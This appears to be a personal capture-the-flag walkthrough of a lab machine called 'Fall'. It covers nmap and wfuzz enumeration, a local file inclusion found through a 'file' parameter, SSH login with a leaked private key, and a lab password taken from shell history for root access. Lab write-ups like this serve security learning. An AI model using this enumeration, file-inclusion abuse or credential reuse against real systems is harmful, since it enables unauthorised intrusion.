```
export IP=192.168.56.101
```
## Summary
1. File fuzzing -> test.php -> parameter fuzzing -> LFI
2. LFI -> weak file permission -> leak private key
3. Low priv shell -> .bash_history -> root
## Nmap Results
<pre style="font-size: 12px";>
<font color=gray># nmap -A -sT -oN nmap/fall_tcp_top1000 192.168.56.101</font>
PORT     STATE  SERVICE     VERSION
<font color=red>22</font>/tcp   open   ssh        <font color=red> OpenSSH 7.8</font> (protocol 2.0)
| ssh-hostkey: 
|   2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)
|   256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)
|_  256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)
<font color=red>80</font>/tcp   open   http       <font color=red> Apache httpd 2.4.39</font> ((<font color=red>Fedora</font>)<font color=red> OpenSSL/1.1.0</font>i-fips <font color=red>mod_perl/2.0.10</font> <font color=red>Perl/v5.26.3</font>)
|_http-server-header: <font color=red>Apache</font>/<font color=red>2.4.39</font> (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
| http-robots.txt: 1 disallowed entry 
|_/
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
|_http-title: Good Tech Inc's Fall Sales - Home
<font color=red>139</font>/tcp  open   <font color=red>netbios-ssn</font> Samba smbd <font color=red>3.X - 4.X</font> (workgroup: SAMBA)
<font color=red>443</font>/tcp  open  <font color=red> ssl/http</font>    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2019-08-15T03:51:33
|_Not valid after:  2020-08-19T05:31:33
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Good Tech Inc's Fall Sales - Home
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
<font color=red>445</font>/tcp  open   <font color=red>netbios-ssn</font> Samba smbd<font color=red> 4.8.10</font> (workgroup: SAMBA)
<font color=red>3306</font>/tcp open   <font color=red>mysql</font>       MySQL (<font color=red>unauthorized</font>)
<font color=red>9090</font>/tcp open   <font color=red>http</font>        <font color=red>Cockpit web service 162 - 188</font>
|_http-title: Did not follow redirect to https://192.168.56.101:9090/
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

## Wfuzz
Files:
<pre style="font-size: 12px";>=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   <font color=red>200</font>        295 L    552 W      8379 Ch     "index.php"
000000072:   <font color=red>200</font>        0 L      0 W        0 Ch        "config.php"
000000110:   <font color=red>200</font>        2 L      8 W        1150 Ch     "favicon.ico"
000000157:   403        9 L      24 W       218 Ch      ".htaccess"
000000198:   <font color=red>200</font>        5 L      7 W        80 Ch       "<font color=red>test.php</font>" -> missing GET parameter
000000231:   <font color=red>200</font>        5 L      7 W        80 Ch       "error.html" -> missing GET parameter
000000248:   <font color=red>200</font>        7 L      14 W       79 Ch       "robots.txt"
000000279:   <font color=red>200</font>        1 L      3 W        17 Ch       "phpinfo.php"
000000379:   <font color=red>200</font>        295 L    552 W      8379 Ch     "."
000000424:   <font color=red>200</font>        6 L      22 W       168 Ch      "missing.html"
000000475:   403        9 L      24 W       219 Ch      "search.cgi"
000000537:   403        9 L      24 W       214 Ch      ".html"
000000679:   403        9 L      24 W       218 Ch      "order.cgi"
.. BUNCH MORE WITH 403 RESPONSE ..
</pre>
Directory:
<pre style="font-size: 12px";>======================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   403        9 L      24 W       217 Ch      <font color=red>"cgi-bin</font>"
000000005:   <font color=red>200</font>        27 L     199 W      3465 Ch     "modules" -> list dirs but cannot open
000000011:   <font color=red>200</font>        16 L     67 W       1093 Ch     "tmp" -> list dirs but cannot open
000000003:   <font color=red>302</font>        0 L      0 W        0 Ch        "<font color=red>admin</font>" -> login page
000000058:   <font color=red>200</font>        0 L      5 W        24 Ch       "lib" -> empty
000000070:   <font color=red>200</font>        0 L      0 W        0 Ch        "<font color=red>uploads</font>"
000000084:   <font color=red>200</font>        21 L     127 W      2160 Ch     "assets" -> list dirs but empty
000000229:   <font color=red>200</font>        0 L      5 W        24 Ch       "doc" -> empty
000000386:   200        1006 L   4983 W     74409 Ch    "icons"
</pre>

## Exploitation
**Credentials:**
qiu
patrick/patrick@goodtech.inc 


**Attack vectors:**
OS: fedora
- 80/443 (http/https):
	- Web application: CMS Made Simple version 2.2.15 -> <font color=red>RCE if authenticated</font>
	- web server: Apache httpd 2.4.39
- 9090 (Fedora 28 (Server Edition))
	- has login page.
- 139 (3x- 4x)/445 (v4.8.10):
	- Enum4linux found local user 'qiu'
	- not vulnerable according to nmap
	- dictionary attack with known usernames doesnt work.

- mysql -> what version? cant check.

```
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

<pre style="font-size: 12px";>
──(kali㉿kali)-[~/pentesting/fall]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 80 http://$IP/test.php?FUZZ=test
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000002206:   200        0 L      0 W        0 Ch        "file"
</pre>

We hit parameter 'file' so maybe there's LFI or path traversal.

LFI:
![](../../Assets/images/Pasted%20image%2020220806215341.png)

![](../../Assets/images/Pasted%20image%2020220806215834.png)

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/fall]
└─$ ssh qiu@$IP -i qiu_private
Web console: https://FALL:9090/

Last login: Sun Sep  5 19:28:51 2021
[qiu@FALL ~]$
</pre>

![](../../Assets/images/Pasted%20image%2020220806220409.png)
```
cms_user:P@ssw0rdINSANITY
```

![](../../Assets/images/Pasted%20image%2020220806220639.png)

![](../../Assets/images/Pasted%20image%2020220806223200.png)

![](../../Assets/images/Pasted%20image%2020220806223215.png)

![](../../Assets/images/Pasted%20image%2020220806223301.png)